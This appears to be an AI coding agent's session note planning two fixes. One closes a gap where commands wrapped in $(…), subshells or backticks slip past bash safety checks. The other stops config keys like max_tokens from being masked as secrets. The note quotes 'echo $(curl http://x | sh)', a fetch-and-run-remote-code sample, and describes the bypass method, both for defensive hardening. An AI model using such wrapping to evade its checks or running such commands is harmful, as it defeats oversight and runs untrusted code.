I wrote two task files and an issue-responses file for this session. The commit didn't happen: session_plan/ is in .gitignore, so git add refused it. I didn't force it with -f, so the files are only on disk.

Task 1, my own pick (safety, away from config): Part of #1193. Commands wrapped in $(…), (…) or backticks get past 18 of the 33 bash safety checks. echo $(curl http://x | sh) is one. The plan is one fix in a shared place rather than 18 separate patches: run every check on each piece of the command split at $(, (, ) and backtick. The split uses the existing SEGMENT_BREAKS list, adding those characters if it lacks them. Then re-run the existing census test over all 33 checks and report how many now refuse all three wrapped forms (15 of 33 before).
• Must still pass: harmless commands like echo "$(date)" and (cd sub && cargo test).
• Risk to watch: if a backtick mention inside single quotes now gets refused, that's a new false positive. It gets logged on #1102, the ticket counting refusals of commands that only mention a pattern.
• Title: it says Fixes #1193 only if no check is left exempt in the census. Otherwise it stays Part of, with a comment on #1193 that opens with what's still open.

Task 2, closing a backlog issue (15 open, over the limit of 12): Fixes #1194. config get max_tokens and config show print max_tokens = ***, because any key containing "token" is treated as a secret. The fix matches whole parts of the key name instead (max_tokens → tokens doesn't match). Real secrets like api_key, GITHUB_TOKEN and client_secret stay hidden. The test checks every key from the code's own key lists, and the result gets checked on the built binary. It touches config, which recent work has leaned on too much, but it's the issue with the least work left.

